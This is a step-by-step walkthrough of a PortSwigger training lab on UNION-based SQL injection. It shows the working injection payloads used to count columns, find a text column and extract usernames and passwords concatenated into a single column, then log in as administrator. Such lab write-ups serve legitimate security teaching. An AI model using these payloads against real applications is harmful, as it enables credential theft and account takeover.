[Lab: SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)  


## Goal
Retrieve the administrator's username and password when only one column supports text data.

## Steps to Solve

1. **Launch the Lab:** Open the PortSwigger lab and navigate to the shop interface.

2. **Intercept the Request:** Click on any product category and intercept the category filter request using Burp Suite.

3. **Determine the Number of Columns:** Use `ORDER BY` to identify the number of columns.

- `' ORDER BY 1` – Success
- `' ORDER BY 2` – Success
- `' ORDER BY 3` – Error

**Result:** The query returns two columns.

4. **Identify Text-Compatible Columns:** Test the columns using:

```sql
' UNION SELECT NULL,'abc'--
```

**Result:** Only the second column accepts text data.

5. **Retrieve Username and Password:** Use string concatenation to retrieve both values in a single column.

```sql
' UNION SELECT NULL,username||' : '||password FROM users--
```

**Result:** Retrieved the administrator's credentials.

- **Username:** `administrator`
- **Password:** `71zmq1kmob6eazjctzf8`

6. **Login as Administrator:** Navigate to **My Account** and log in using the retrieved credentials.

**Result:** Successfully logged in as administrator and completed the lab.

## Key Takeaways

- **UNION SELECT:** Combines results from multiple SQL queries.
- **Text-Compatible Column:** Identifies which column can display string data.
- **String Concatenation (`||`):** Combines multiple values into a single string.
- **Data Extraction:** Retrieves multiple database values through one text-compatible column.

## Lab Information

- **Vulnerability:** SQL Injection (SQLi)
- **Attack Type:** UNION-Based SQL Injection
- **Technique:** String Concatenation
- **Tool:** Burp Suite Community Edition
